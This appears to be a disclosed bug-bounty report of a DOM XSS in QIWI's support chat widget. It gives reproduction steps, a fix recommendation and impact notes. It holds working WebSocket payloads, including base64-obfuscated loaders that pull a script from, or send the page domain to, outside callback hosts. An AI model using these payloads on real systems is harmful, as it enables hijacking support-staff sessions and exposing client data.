title: DOM XSS triggered in secure support desk

profile.name: QIWI
profile.about: The QIWI brand is a family brand that consolidates several directions: kiosks, wallet, bank.

summaries.content: ##Summary Due to insufficient input sanitization, an attacker can send a crafted WebSocket message that will result in arbitrary code execution in the chat support backend, giving an attacker control to support tickets and client information. ##Technical details The vulnerability exists in line `2544` of `https://chat.qiwi.com/widget/ocWidget/src/js/ocWidget.chat.js?ver=1.7.1` when uploaded attachments are included in the DOM of the chat window. In particular, the parameters `media_thumb` and `media_url` are controlled by the attacker, and are not sanitized. For example, sending the following payload in an ongoing chat conversation (web socket), leads to successful XSS: ```javascript ws.send('{"action":"send_message","data":{"type":2,"uuid":"katO0xuiIy","media_thumb":"xxdata\\" onerror=\\"eval(atob(\'dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vcGl0ci54c3MuaHQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7\'));//","media_url":"media-url"},"uuid":"katO0xuiIy","token":"bz+OjfTeBL/BRozszXwKbT10voEb0crFVRWBktvQifQ=","projectId":1,"messengerType":9}') ``` Note that the Base64 encoded string translates to: ```javascript var a=document.createElement("script");a.src="https://pitr.xss.ht";document.body.appendChild(a); ``` You can see the DOM element that will be created by manually executing the RTC().create() function from the console on the homepage https://qiwi.com/main: ```javascript RTC().create('div', {id: "a",className: 'ocWidget__message ocWidget-message-loading ocAnimation-fadeIn',innerHTML: ocWidget.tpls.sentImage({size: {width: 0, height: 0},src: "data\" onerror=\"eval(atob('KG5ldyBJbWFnZSgpKS5zcmM9J2h0dHBzOi8vdC5ob25va2kubmV0Lz8nK2VuY29kZVVSSShkb2N1bWVudC5kb21haW4p'))//",modal: "media-url",date: "now"})}); ``` which results in the following HTML (snipped): ```html ``` My blind XSS was triggered on `` from the following IPs: ``` 176.56.0.107 95.78.162.97 ``` See the attached screenshot illustrating the access of the included XSS payload. Steps to reproduce Log in to https://qiwi.com/main Click the "chat" button in the lower right corner and wait for the session to be established; Execute the following Javascript in your Chrome ```javascript ocWidget.websocket.send({ "action":"send_message", "data": { "type":2, "uuid":"katO0xuiIy", "media_thumb":"xxdata\" onerror=\"eval(atob('YWxlcnQoMSk='));//", "media_url":"media-url" },"uuid":"katO0xuiIy" }) ``` Note - this will trigger an alert box at the side of the support desk employee. Replace the payload with a base64-encoded version of a callback to observe the blind callback if preferred. ##Recommendation I recommend to not use user-provided input without further sanitization to build dynamic elements on a page. ##Impact Successful exploitation of the XSS vulnerability could allow an attacker to steal session credentials, perform unauthorized actions in the backend application on behalf of legitimate support employees or spread malware via the Qiwi application. Notably, this vulnerability can give access to sensitive client information that should only be available to staff. Also note that this XSS is "wormeable", in the sense that the access to support staff could be leveraged to in turn affect Qiwi clients with whom they are having a conversation. I have not attempted to demonstrate that for obvious reasons. Furthermore, the DOM of the support application Workspace 1.14.1 contains sensitive information of staff, including usernames and hashes. These might be used by attackers to elevate privileges in other applications.
